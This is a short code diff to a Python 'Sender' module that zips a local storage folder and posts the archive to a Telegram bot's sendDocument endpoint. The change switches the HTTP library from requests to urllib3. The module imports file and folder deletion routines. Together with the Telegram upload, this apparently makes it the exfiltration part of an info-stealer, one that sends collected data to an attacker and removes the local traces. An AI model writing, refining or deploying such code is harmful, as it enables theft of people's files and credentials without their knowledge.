@@ -1,5 +1,5 @@
 from os import remove
-from requests import post
+from urllib3 import poolmanager
 from shutil import make_archive, rmtree
 
 from ..utils.config import SenderConfig
@@ -22,13 +22,15 @@ class Sender:
 
         with open(rf"{self.storage_path}\{self.zip_name}.zip", "rb") as file:
 
-            post(
+            http = poolmanager.PoolManager()
+
+            http.request(
+                method="POST",
                 url=f"https://api.telegram.org/bot{self.token}/sendDocument",
-                data={
-                    "chat_id": self.user_id
-                },
-                files={
-                    "document": file
+                fields=
+                {
+                    "chat_id": self.user_id,
+                    "document": (f"{self.zip_name}.zip", file.read(), "document/zip"),
                 }
             )
 
